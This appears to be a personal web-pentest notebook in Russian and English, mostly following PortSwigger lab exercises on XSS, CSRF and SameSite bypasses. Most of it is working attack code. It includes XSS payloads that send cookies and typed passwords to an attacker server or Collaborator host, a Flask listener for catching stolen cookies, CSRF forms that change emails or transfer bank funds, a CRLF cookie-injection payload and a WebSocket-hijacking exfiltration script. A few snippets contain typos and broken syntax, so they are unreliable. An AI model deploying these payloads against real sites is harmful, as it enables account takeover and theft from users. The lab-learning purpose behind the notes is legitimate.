# Exploiting cross-site scripting to steal cookies

[PayloadsAllTheThings - XSS - data-grabber-for-xs](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss)
Пример в CORS: 
```javascript
<script>
  fetch('https://{site.com}', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```
или
```html
<img src=x onerror=this.src="http://<my_server>:<port>/"+btoa(document.cookie)>
```
#### Exploiting cross-site scripting to capture passwords
Здесь представлена форма, которая ожидает ввода логина и пароля, и сказу отправляет из в коллаборатор.
```javascript
<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method:'POST', mode:'no-cors', body:username.value+':'+this.value });">
```
### Python web-server to take cookie:
```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST'])
def handle_post():
	message = request.data.decode('utf-8')
	print("Received message:", message)
	return 'Message recieved'
if __name__ == '__main__':
	app.run(port=8080)
```
#### Atack payload
```javascript
<iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: 'message=Hello', headers: { 'Content-Type': 'text/plain' }});" style="display: none;">
```
```javascript
<iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: document.cookie, headers: { 'Content-Type': 'text/plain' }});" style="display: none;">
```
# CSRF без всякой защиты (use exploit server)
https://portswigger.net/web-security/csrf/lab-no-defenses
Repeater -> Engagement tools -> Generate CSRF PoC 
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0afc009604f04a3c817484ab003500e8.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="zxc&#64;zxc&#46zxc" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```
# CSRF уязвимости токена

## Exploiting XSS to perform CSRF
**Пользователь**, зашедший на страницу с **xss**, направит запрос и свой **csrf токен** на смену **email** на **'/my-account/change-email'**, если **токен** висит в **html**.
```javascript
<script>  
var req = new XMLHttpRequest();  
req.onload = handleResponse;  
req.open('get','/my-account',true);  
req.send();  
function handleResponse() {  
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  
var changeReq = new XMLHttpRequest();  
changeReq.open('post', '/my-account/change-email', true);  
changeReq.send('csrf='+token+'&email=test@test.com')  
};  
</script>
```
## CSRF, когда проверка токена зависит от метода запроса (use exploit server)
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method
1. Repeater -> Change request method
2. Repeater -> Engagement tools -> Generate CSRF PoC
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a89008e03d199f389c89f8100bb0096.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="zxc&#64;zxc&#46;zxc" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
## CSRF, когда проверка токена зависит от его наличия (use exploit server)
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present
just delete csrf token.
1. Repeater -> Change request method
2. Repeater -> Engagement tools -> Generate CSRF PoC
## CSRF, когда токен не привязан к сессии пользователя (use exploit server)
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session
Использовать свой токен в эксплойте на сервере
1. Proxy -> Intercept -> Intercept is off (to on) -> go to repeter
2. Repeater -> Engagement tools -> Generate CSRF PoC
## CSRF, когда токен привязан к не сеансовому cookie или дублирует не сеансовый cookie
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie
Нужно в форме подвязать свои не сеансовые cookie. Это возможно, если найти пользовательский input, который недостаточно валидирован и передаёт своё значение в header ответа. 

Пусть существует возможность сделать поисковый запрос на сайте:
```http
GET /?search=qwe HTTP/2
Host: 0a5000e0034cd7ff82dc2511007f007e.web-security-academy.net
Cookie: csrfKey=LAKDqGn6ShUWMc54eSO2ZV176pPOh7Fi; session=fZSQ6mf9BoFyRGfEoI4q9WAYTTjG8Kaw
...
```
И получить ответ:
```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=qwe; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3419

<!DOCTYPE html>
<html>
...
```
Тогда можно переписать запрос, вставив в него нужный нам `Set-Cookie`:
```http
GET /?search=q%0D%0ASet-Cookie:%20csrfKey=LAKDqGn6ShUWMc54eSO2ZV176pPOh7Fi%20Same-Site=None HTTP/2
Host: 0a5000e0034cd7ff82dc2511007f007e.web-security-academy.net
Cookie: csrfKey=LAKDqGn6ShUWMc54eSO2ZV176pPOh7Fi; session=fZSQ6mf9BoFyRGfEoI4q9WAYTTjG8Kaw
...
```
Тогда пэйлоадом будет выступать:
1. Repeater -> Engagement tools -> Generate CSRF PoC = $FORM
```html
$FORM
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()" />
```
# SameSite cookie
>**SameSite** - механизм безопасности браузера, который определяет, когда cookie веб-сайта включаются в запросы, исходящие от других веб-сайтов. Ограничения cookie SameSite обеспечивают частичную защиту от различных межсайтовых атак, включая CSRF, межсайтовые утечки и некоторые эксплойти CORS.
![[SameSite and Origin.png]]

|   |   |   |   |
|---|---|---|---|
|**Request from**|**Request to**|**Same-site?**|**Same-origin?**|
|`https://example.com`|`https://example.com`|Yes|Yes|
|`https://app.example.com`|`https://intranet.example.com`|Yes|No: mismatched domain name|
|`https://example.com`|`https://example.com:8080`|Yes|No: mismatched port|
|`https://example.com`|`https://example.co.uk`|No: mismatched eTLD|No: mismatched domain name|
|`https://example.com`|`http://example.com`|No: mismatched scheme|No: mismatched scheme|
![[SameSite ограничения.png]]
![[SameSite strict.png]]
## Обход SameSite Lax через переопределение метода (use exploit server)
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override
Может быть полезным Burp расширение: `Param Miner`.

Сначала пробуем переопределить метод запроса с POST на GET:
1. Repeater->Change request method
2. Пробуем параметр **`&_method=POST`**: GET /my-account/change-email?email=q%40q.q**`&_method=POST`** HTTP/2
Эксплойт:
```javascript
<script>
document.location="https://{site.com}/change-email?email=q%40q.q&_method=POST"
</script>
```
## Обход SameSite Lax через обновление cookie (use exploit server)
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
Cookies с ограничениями Lax SameSite обычно не отправляются в межсайтовых POST-запросах, но есть и исключения.  
  
Если веб-сайт не включает атрибут SameSite при установке cookie, Chrome автоматически применяет ограничения Lax по умолчанию. Однако, чтобы не нарушать механизмы единой авторизации (SSO), он не применяет эти ограничения в течение первых 120 секунд для POST-запросов верхнего уровня. В результате в течение двух минут пользователи могут быть подвержены межсайтовым атакам.

В лабораторной работе настроен механизм авторизации через сторонний сервис. Значит если мы обновим ограничение первых 120 секунд, вызываемое при авторизации через сторонний сервис, то сможем воспользоваться  cookie.

1. Repeater -> Engagement tools -> Generate CSRF PoC = $FORM
```javascript
$FORM
<script>
	window.open('https://{site.com}/social-login');
	setTimeout(changeEmail, 5000);

	const changeEmail = () => document.forms[0].submit();
	/* или
	function changeEmail() {
		document.forms[0].submit();
	}
	*/
</script>
```

## SameSite Strict - перенаправление на стороне клиента (use exploit server)
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect
Допустим на сайте есть скрипт:
```javascript
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```
В таком случае можно использовать open redirect - маршрут по изменению email в параметре postId:
```http
GET /site.com/?postId=../../../{маршрут на смену email}
```
Далее просто проэксплуатирвоать нагрузку:
```javascript
<script>
	document.lacation = 'https://site.com/?postId=../../../{маршрут на смену email}'
</script>
```
По сути нужно лишь проэксплуатировать open redirect, если он есть на сайте.

## SameSite Strict через дочерний домен ([cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) ([CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)))
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
Допустим есть сервер с живым чатом, использующий веб-сокеты для загрузки контента даже неавторизованного пользователя. Можно открыть CSRF соединение искусственно на своём explit сервере:

``` javascript
<script>
var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; 
ws.onmessage = function(event) { 
	fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; 
</script>
```
В итоге в тело запроса колобаратора попадёт подтверждение наличия уязвимости CSWSH.
С помощью Target -> Site map можно изучить веб-ресурс и поискать сторонние домены, например в js скриптах или html. В данной лабораторной оказывается уязвимый поддомен с XSS. 

На уязвимом сайте делаем XSS в GET запросе с закодированным в URL скриптом выше.
```http
https://cms-0ae4007f048e205982bcbfed00bc0073.web-security-academy.net/login?username=%3Cscript%3E{here code upper}%3C/script%3E&password=q
```

# Валидация заголовка Refere

## CSRF, когда проверка Referer зависит от наличия заголовка
https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present
1. Если убрать заголовок Referer, то возможно, что уязвимость проэксплуатируется.
2. Repeater -> Engagement tools -> Generate CSRF PoC
3. Добавляет тег `<meta name="referrer" content="no-referrer">`

## CSRF с нарушенной проверкой Referer
https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken
Допустим есть следующий параметр:
```
Referer: https://www.originSite.com/my-account?id=wiener
```
пробуем изменить его, получаем всё ещё рабочий Referer:
```
Referer: https://google.com?https://www.originSite.com/my-account?id=wiener
```
1. Repeater -> Engagement tools -> Generate CSRF PoC
2. В форме меняем аргументы pushState, добавляя `?`+`originRegerer`
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a28001a0421cd37808adad500f500b1.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="qwe&#64;qwe&#46;qwe" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?https://www.originSite.com/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
3. Header на explit server-е должен содержать заголовок:
```
Referrer-Policy: unsafe-url
```
	чтобы браузер позволил передать get параметр в функции pushState.

# CSRF с JSON

## Pre-fight Request

> Чтобы не вызвать предполётный запрос, нужно:
> 1. **Метод:** GET, POST, HEAD.
> 2. **HTTP-заголовки:** помимо автоматически добавляемых заголовков по умолчанию, можно установить только безопасные заголовки CORS.
> 3. **Тип контента:** должен быть "application/x-www-form-urlencoded", "text/plain", "multipart/form-data". ReadableStram: не открывать ReadableStram в запросе.
> 4. **Нет прослушивателей XMLHttpRequestUpload**
> 
> Можно проверить сайт на 4 ситуации:
> 1. **Content-Type не проверяется** на стороне сервера, а также **не проверяются данные POST**, правильно ли они отформатированы. [[#**Content-Type не проверяется** на стороне сервера, а также **не проверяются данные POST**, правильно ли они отформатированы.|1.]]
>2. **Content-Type не проверяется** на стороне сервера, а также **не проверяются данные POST**, правильно ли они отформатированы. [[#**Content-Type не проверяется** на стороне сервера, но **проверяются данные POST** - правильно ли они отформатированы или нет.|2.]]
>3. С помощью запроса XMLHTTP/запроса AJAX: когда **Content-Type проверяется** на стороне сервера, и сервер принимает только "Content-Type: "application/json". [[#С помощью запроса XMLHTTP/запроса AJAX когда **Content-Type проверяется** на стороне сервера, и сервер принимает только "Content-Type "application/json".|3.]]
>4. С помощью файла FLASH: когда **Content-Type проверяется** на стороне сервера и сервер принимает **только "Content-Type: application/json"**, а **CORS также настроен правильно**. [[#С помощью файла FLASH когда **Content-Type проверяется** на стороне сервера и сервер принимает **только "Content-Type application/json"**, а **CORS также настроен правильно**|4.]]

##### **Content-Type не проверяется** на стороне сервера, а также **не проверяются данные POST**, правильно ли они отформатированы.

В следующей форме отправляется в качестве параметра input text/plain, в name которого находится нужный нам JSON.
```html
<html>  
<body>  
<form action=”[https://members.bankofdirectdefense.com/accounts/transfer](https://members.bankofdirectdefense.com/accounts/transfer)" method=”POST” enctype=”text/plain”>  
<input type=”hidden” name=”{\”from-account\”: 1,\”toAccount\”: \”021000021–9876543210\”,\”amount\”: 1000,\”currency\”: \”USD\”,\”foo” value=”\”:\”bar\”}” />  
</form>  
<script>document.forms[0].submit();</script>  
</body>  
</html>
```

##### **Content-Type не проверяется** на стороне сервера, но **проверяются данные POST** - правильно ли они отформатированы или нет.

```html
<html>  
<title>JSON CSRF POC</title>  
<body>  
<center>  
<h1> JSON CSRF POC </h1>  
<script>  
fetch('http://vul-app.com', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"name":"attacker","email":"attacker.com"}'});  
</script>  
<form action="#">  
<input type="button" value="Submit" />  
</form>  
</center>  
</body>  
</html>
```


##### С помощью запроса XMLHTTP/запроса AJAX: когда **Content-Type проверяется** на стороне сервера, и сервер принимает только "Content-Type: "application/json".

* Заголовок "Content-Type" должен быть разрешен сервером, чтобы мы могли добавить пользовательский заголовок, который браузер напрямую не позволяет нам добавить. Запрашиваемые Method и Origin также должны быть разрешены сервером. Проверьте ответ префлайта.  
* "Access-Control-Allow-Credential" должен быть true.  
* ACAO (Access-Control-Allow-Origin) не должно быть статическим. Приложение динамически устанавливает ACAO на происхождение запроса. Согласно спецификациям CORS, значение wildcard в паре с ACAC (Access-Control-Allow-Credential), установленным в true, приведет к ошибке.

```html
<html>  
<body>  
<script>  
function submitRequest()  
{  
var xhr = new XMLHttpRequest();  
xhr.open("POST", "https:\/\/members.bankofdirectdefense.com\/accounts\/transfer", true);  
xhr.setRequestHeader("Content-Type", "application\/json");  
xhr.withCredentials = true;  
xhr.send("{\"from-account\": 1,\"toAccount\": \"021000021-9876543210\",\"amount\": 1000,\"currency\": \"USD\"}");  
submitRequest();  
</script>  
</body>  
</html>
```

##### С помощью файла FLASH: когда **Content-Type проверяется** на стороне сервера и сервер принимает **только "Content-Type: application/json"**, а **CORS также настроен правильно**
https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b